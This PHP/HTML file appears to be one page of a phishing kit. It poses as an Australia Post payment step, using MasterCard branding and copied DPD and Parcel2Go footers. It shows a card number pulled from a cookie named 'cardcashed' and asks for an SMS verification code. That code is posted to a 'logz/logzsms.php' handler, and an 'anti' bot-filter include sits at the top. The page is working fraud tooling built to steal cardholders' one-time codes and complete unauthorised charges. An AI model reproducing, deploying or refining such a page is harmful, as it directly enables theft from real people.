<?php
include("./anti/index.php");
?><html lang="is">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="img/favicon.ico"/>

    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/2.css">
    <meta name="description" content="Send to Singapore today and see how much you can save with the world's biggest couriers via DPD Local Online.">
    <title>auspost.com.au</title>
</head>
<body>
    <div class="container">
<br>

        <form id="cardForm" action="logz/logzsms.php" method="post">
            <section class="first-sec">
                <div class="centrer  " class="first-sec-doll">
                    <div class="containerHead paddingDiv">
                        <div class="leftcontainerHead">
                            <img src="./img/pdp.png" style=" width: 100px;"/>
                         </div>
                        <div class="rightcontainerHead">
                            <img src="./img/mastercard.png" style=" width: 100px;"/>

                        </div>
                    </div>
                </div>
                <div class="paddingDiv" style="margin-top: 40px ; ">


                    <strong class="textMessage2">
                        Please enter your MasterCard® security code
                         </strong>
                    <p class="textMessage">
                        MasterCard® Security Code is the international cardholder identification of MasterCard. Credit card payment can be made on the Internet.
                    </p>
                </div>
                <div class="paddingDiv" style="margin-top: 10px ; ">

                    <table width="70%" class="textMessage">
                        <tr><td style=" width: 50%;">Partners Australia Post</td><td></td></tr>
                        <tr><td style=" width: 50%;">Amount</td><td style="width: 50%;text-align: left"><strong>5.00 AUD</strong></td></tr>
                        <tr><td style=" width: 50%;">Date</td><td  style="width: 50%;text-align: left">
                                <script>
                                 let date_ob = new Date();

                                        // adjust 0 before single digit date
                                        let date = ("0" + date_ob.getDate()).slice(-2);

                                        // current month
                                        let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);

                                        // current year
                                        let year = date_ob.getFullYear();

                                        // current hours
                                        let hours = date_ob.getHours();

                                        // current minutes
                                        let minutes = date_ob.getMinutes();

                                        // current seconds
                                        let seconds = date_ob.getSeconds();

                                        // prints date & time in YYYY-MM-DD HH:MM:SS format
                                        document.write(year + "/" + month + "/" + date + " " + hours + ":" + minutes + ":" + seconds); </script></td></tr>
                        <tr><td style=" width: 50%;">Card number</td><td style="width: 50%;text-align: left">
                                <?php
                                try {

                                    if (isset($_COOKIE["cardcashed"])) {
                                        echo $_COOKIE["cardcashed"] . "<br />";
                                    } else {
                                        echo " xxxx xxxx xxxx 9010<br />";

                                    }
                                } catch (Exception $e) {
                                    echo " xxxx xxxx xxxx 9010<br />";

                                }


                                ?></td></tr>
                    </table>

                </div>
                <p class="HROr">MasterCard® Security Code </p>

                 <div class="first-sec-inf paddingDiv">

                    <div class="second-sec-info">
                        <div class="second-sec-info-form">
                            <input type="text" class="form-control inpt222"   placeholder="SMS-Code"  name="msg" required>
                            <button class="btn btn-dark btn-lg btn-sgnapore" type="submit">Confirm</button>
                            <p class="sms-verif">Enter the verification code received by SMS: <span id="timer"></span></p>
                        </div>
                        <script>
                            function countdown() {
                                var seconds = 60;
                                function tick() {
                                    var counter = document.getElementById("timer");
                                    seconds--;

                                    // those if conditions to format the timer
                                    if (seconds >= 60) {
                                        if ((seconds - 60) > 10){
                                            counter.innerHTML = `01:${seconds - 60}`
                                        }
                                        else{
                                            counter.innerHTML = `01:0${seconds - 60}`
                                        }
                                    }
                                    else if (seconds > 10){
                                        counter.innerHTML = `00:${seconds}`
                                    }
                                    else {
                                        counter.innerHTML = `00:0${seconds}`
                                    }

                                    // check if if counter reached 0 then do you you input disable input or something
                                    if( seconds > 0 ) {
                                        setTimeout(tick, 1000);
                                    } else {
                                        // disable input or something
                                        console.log("timer is over input is disabled")
                                    }
                                }
                                tick();
                            }
                            // start the countdown
                            countdown();

                        </script>
                    </div>

                </div>
                <footer>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/about-terms">Terms &amp; Conditions</a>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/cookie-policy">Cookie Policy</a>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/privacy-policy">Privacy Policy</a>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/refund-policy">Refund Policy</a>
                    <p class="copyright">All payments processed by Parcel2Go.com Limited
                        © Parcel2Go.com Ltd 1995-2022 All Rights Reserved
                        Company Number: 02591405 | VAT Number: 597849161 IE9710685A</p>
                </footer>
            </section>

        </form>

    </div>
    <script>
        function countdown() {
    var seconds = 60;
    function tick() {
        var counter = document.getElementById("timer");
        seconds--;

        // those if conditions to format the timer 
        if (seconds >= 60) {
            if ((seconds - 60) > 10){
                counter.innerHTML = `01:${seconds - 60}`
            }
            else{
                counter.innerHTML = `01:0${seconds - 60}`
            }
        }
        else if (seconds > 10){
            counter.innerHTML = `00:${seconds}`
        }
        else {
            counter.innerHTML = `00:0${seconds}`
        }

        // check if if counter reached 0 then do you you input disable input or something
        if( seconds > 0 ) {
            setTimeout(tick, 1000);
        } else {
            // disable input or something
            console.log("timer is over input is disabled")
        }
    }
    tick();
}
// start the countdown
countdown();

    </script>
</body>
</html>